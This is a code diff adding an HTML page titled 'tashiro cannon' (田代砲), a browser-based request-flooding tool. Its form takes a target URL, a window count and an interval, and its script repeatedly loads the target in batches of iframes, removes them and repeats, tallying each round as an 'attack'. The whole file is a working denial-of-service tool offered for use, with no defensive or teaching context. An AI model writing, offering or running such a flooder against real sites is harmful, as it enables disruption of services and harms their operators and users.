@@ -1,0 +1,76 @@
+
+<!DOCTYPE html>
+<head>
+    <title>田代砲(iframe式)</title>
+    <style>
+        .container {
+            width: 50vh;
+            height: 50vh;
+            margin: 0 auto;
+            border: 1px solid black;
+            margin-top: 20px;
+            overflow: auto;
+        }
+    </style>
+</head>
+<center>
+    <h1>tashiro cannon</h1>
+    <p>enter the url.</p>
+    <input type="text" id="target" value="http://localhost:3000">
+    <p>窓数:</p>
+    <input type="number" id="Window" value="5">
+    <p>攻撃間隔 (ミリ秒):</p>
+    <input type="number" id="CoolTime" value="1000">
+    <br><button style="margin-top: 20px;" onclick="safe=0; attack()">攻撃</button>
+    <br><button style="margin-top: 20px;" onclick="safe=1;">停止</button>
+    <p id="times"></p>
+    <div id="frames" class="container"></div>
+</center>
+<script>
+    let safe = 1;
+    let times = 0;
+    const d = document;
+    const Target = d.getElementById('target');
+    const Windows = d.getElementById('Window');
+    const cooltime = d.getElementById('CoolTime');
+    const Telement = d.getElementById('times');
+
+    function attack() {
+        if (safe === 1) {
+            return;
+        }
+
+        try {
+            const AttackUrl = new URL(Target.value.trim());
+
+            function createFrame(windowCount, url) {
+                for (let i = 0; i < windowCount; i++) {
+                    const frame = document.createElement('iframe');
+                    frame.name = "attackFrame";
+                    frame.src = url;
+                    document.getElementById('frames').appendChild(frame);
+                }
+            }
+
+            function removeFrames() {
+                const frames = document.getElementsByName('attackFrame');
+                const framesContainer = document.getElementById('frames');
+                while (frames.length > 0) {
+                    framesContainer.removeChild(frames[0]);
+                }
+            }
+
+            createFrame(Number(Windows.value), AttackUrl);
+
+            setTimeout(() => {
+                times += Number(Windows.value);
+                Telement.textContent = `${times}回攻撃`;
+                removeFrames();
+                attack();
+            }, Number(cooltime.value));
+
+        } catch (err) {
+            console.error('error:', err);
+        }
+    }
+</script>
